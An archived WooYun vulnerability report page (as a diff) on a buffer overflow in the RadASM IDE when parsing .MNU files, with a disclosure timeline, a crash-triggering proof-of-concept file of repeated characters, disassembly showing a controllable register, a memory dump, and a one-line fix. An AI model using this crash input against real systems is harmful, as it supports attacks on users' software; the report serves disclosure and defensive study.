@@ -1,0 +1,236 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		RADASM缓冲区溢出漏洞(第三弹）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		RADASM缓冲区溢出漏洞(第三弹）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/光刃">光刃</a> 
+</li><li>提交时间：		2013-12-30 16:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-07：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-24：	细节向普通白帽子公开<br/>
+									2014-02-13：	细节向实习白帽子公开<br/>
+									2014-03-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">第一弹是处理.RC文件的缓冲区溢出漏洞<br />
+第二弹是处理.DLG文件的缓冲区溢出漏洞<br />
+第三弹是处理.MNU文件的缓冲区溢出漏洞<br />
+原理：在处理.MNU文件时未对结构大小进行检测，造成缓冲区溢出。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">原理：在处理.MNU文件时未对结构大小进行检测，造成缓冲区溢出。<br />
+<br />
+这里我随意构造触发程序崩溃的poc 把下面数据以文本形式保存，命名为poc.mnu（80H个1  4个2）<br />
+<br />
+</p><pre><code>1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111112222</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+相应代码：<br />
+<br />
+004245CD   .  8DBD BCFEFFFF lea     edi, dword ptr [ebp-144]<br />
+<br />
+004245D3   .  8B4E 68       mov     ecx, dword ptr [esi+68]          ;  ecx被淹没 可控<br />
+<br />
+004245D6   .  0BC9          or      ecx, ecx<br />
+<br />
+004245D8   .  74 06         je      short 004245E0<br />
+<br />
+004245DA   .  B0 2E         mov     al, 2E<br />
+<br />
+004245DC   &gt;  AA            stos    byte ptr es:[edi]<br />
+<br />
+004245DD   .  AA            stos    byte ptr es:[edi]<br />
+<br />
+004245DE   .^ E2 FC         loopd   short 004245DC<br />
+<br />
+<br />
+<br />
+0B8B0048  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0B8B0058  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 00  111111111111111.<br />
+<br />
+0B8B0068  31 31 31 31 31 31 64 00 31 31 31 31 31 31 31 31  111111d.11111111<br />
+<br />
+0B8B0078  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0B8B0088  31 31 31 31 31 31 31 31 31 31 31 00 31 31 31 31  11111111111.1111<br />
+<br />
+0B8B0098  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0B8B00A8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0B8B00B8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0B8B00C8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 00  111111111111111.<br />
+<br />
+0B8B00D8  32 32 32 32 00 00 00 00 00 00 00 00 00 00 00 00  2222............<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+004010B4  |&gt; /8A0431        /mov     al, byte ptr [ecx+esi]<br />
+<br />
+004010B7  |. |880439        |mov     byte ptr [ecx+edi], al<br />
+<br />
+004010BA  |. |41            |inc     ecx<br />
+<br />
+004010BB  |. |0AC0          |or      al, al<br />
+<br />
+004010BD  |.^\75 F5         \jnz     short 004010B4<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/301647478572dc5e5393ad479b0b9748ae024b33.jpg" target="_blank"><img src="../images/301647478572dc5e5393ad479b0b9748ae024b33.jpg" alt="RADASM.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">检测大小 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/光刃" title="光刃">光刃</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047426" title="RADASM缓冲区溢出漏洞(第三弹）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-01-04 10:56</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47426";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
